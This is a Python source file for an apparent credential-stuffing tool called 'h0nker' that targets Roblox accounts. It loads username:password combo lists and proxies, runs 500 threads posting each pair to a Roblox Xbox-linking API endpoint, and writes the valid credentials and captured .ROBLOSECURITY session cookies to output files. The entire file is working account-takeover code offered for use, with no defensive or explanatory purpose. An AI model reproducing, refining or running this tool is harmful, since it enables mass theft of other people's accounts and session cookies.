from structures import ProxyPool, ComboQueue, Counter
from utils import extract_roblosecurity
import threading
import requests
import secrets
import os
import time
import ctypes

THREAD_COUNT = 500
LOG_INVALIDS = False
LOG_ERRORS = True

checked_count = 0
total_count = 0
counter = Counter()

with open("token.txt") as fp:
    token = fp.read().strip()

with open("combos.txt", encoding="UTF-8", errors="ignore") as fp:
    print("Loading combos ..")
    combos = ComboQueue()
    for index, line in enumerate(fp.read().splitlines()):
        try:
            credential, password = line.split(":", 1)
            if "@" in credential:
                raise Exception("Emails are not supported")
            combos.add(credential, password)
        except Exception as err:
            print(f"Unexpected error while loading line {line+1}: {err} {type(err)}")
    combos.process()
    total_count = combos.size()

with open("proxies.txt", encoding="UTF-8", errors="ignore") as fp:
    print("Loading proxies ..")
    proxies = ProxyPool(fp.read().splitlines())

report_lock = threading.Lock()
def report_success(combo, cookie):
    with report_lock:
        if not os.path.isdir("output"):
            os.mkdir("output")
        with open("output/combos.txt", "a", encoding="UTF-8", errors="ignore") as fp:
            fp.write("%s:%s\n" % combo)
            fp.flush()
        with open("output/cookies.txt", "a", encoding="UTF-8", errors="ignore") as fp:
            fp.write("%s\n" % cookie)
            fp.flush()
        with open("output/comboscookies.txt", "a", encoding="UTF-8", errors="ignore") as fp:
            fp.write("%s:%s:%s\n" % (combo[0], combo[1], cookie.split("_")[-1]))
            fp.flush()

class StatThread(threading.Thread):
    def __init__(self):
        super().__init__()
    
    def run(self):
        while True:
            time.sleep(0.1)
            try:
                ctypes.windll.kernel32.SetConsoleTitleW("  |  ".join([
                    "h0nker",
                    "Progress: %d/%d" % (checked_count, total_count),
                    "CPM: %d" % counter.get_cpm()
                ]))
            except:
                pass

class Thread(threading.Thread):
    def __init__(self):
        super().__init__()
    
    def run(self):
        global checked_count

        while True:
            combo = next(combos)

            try:
                with next(proxies) as proxy:
                    data = '{"username":"%s","password": "%s"}' % combo

                    conn = proxy.get_connection("api.roblox.com")
                    conn.putrequest("POST", "/xboxlive/link-existing-user")
                    conn.putheader("Authorization", token)
                    conn.putheader("Content-Type", "application/json")
                    conn.putheader("Content-Length", str(len(data)))
                    conn.endheaders()
                    conn.send(data.encode("UTF-8"))

                    resp = conn.getresponse()
                    status = resp.read().decode("UTF-8")

                    if status in ["RobloxUserAlreadyLinked", '{"success":true}']:
                        print("[SUCCESS]", combo)
                        counter.add()
                        checked_count += 1
                        combos.key_to_passwords[combo[0].lower()] = []
                        cookie = extract_roblosecurity(resp)
                        report_success(combo, cookie)
                    
                    elif status == "InvalidCredentials":
                        if LOG_INVALIDS:
                            print("[INVALID]", combo)
                        checked_count += 1
                        counter.add()

                    elif status in ["XboxUserAlreadyLinked", "2StepVerificationAccountDenied"]:
                        combos.key_to_passwords[combo[0].lower()] = []
                        checked_count += 1
                    
                    else:
                        raise Exception("Unexpected response: %s" % status)
                
            except Exception as err:
                combos.add(*combo)
                if LOG_ERRORS:
                    print(err)

StatThread().start()
for _ in range(THREAD_COUNT):
    Thread().start()